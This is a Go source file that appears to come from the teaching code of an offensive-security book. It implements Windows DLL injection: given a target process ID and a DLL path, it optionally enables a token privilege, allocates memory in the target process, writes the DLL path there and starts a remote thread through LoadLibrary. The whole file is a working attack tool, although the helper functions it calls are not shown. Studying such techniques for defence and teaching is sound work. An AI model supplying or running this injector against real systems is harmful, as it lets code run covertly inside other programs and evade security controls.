// Process Injection - DLL Filepath

package main

import (
	"flag"
	"log"
	"strconv"

	"github.com/blackhat-go/bhg/ch-12/procInjector/utils"
	"github.com/blackhat-go/bhg/ch-12/procInjector/winsys"
)

var opts struct {
	pid  string
	dll  string
	priv string
}

var inj winsys.Inject

func init() {
	flag.StringVar(&opts.pid, "pid", "0", "the pid number")
	flag.StringVar(&opts.dll, "dll", "", "the dll file")
	flag.StringVar(&opts.priv, "privilege", "", "the token privilege to search")
	flag.Parse()
	var dll2path string
	pid, err := strconv.ParseUint(opts.pid, 10, 64)
	if err != nil {
		log.Fatal(err)
	}
	pid32 := uint32(pid)
	dll2path, err = utils.FullPath(opts.dll)
	if err != nil {
		log.Fatal(err)
	}
	inj.DllPath = dll2path
	inj.DLLSize = uint32(len(dll2path))
	inj.Pid = pid32
	inj.Privilege = opts.priv
}

func main() {
	if opts.priv != "" {
		err := winsys.SetTokenPrivilege(&inj)
		if err != nil {
			log.Fatal(err)
		}
	}
	err := winsys.OpenProcessHandle(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = winsys.VirtualAllocEx(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = winsys.WriteProcessMemory(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = winsys.GetLoadLibAddress(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = winsys.CreateRemoteThread(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = winsys.WaitForSingleObject(&inj)
	if err != nil {
		log.Fatal(err)
	}
	err = winsys.VirtualFreeEx(&inj)
	if err != nil {
		log.Fatal(err)
	}
}
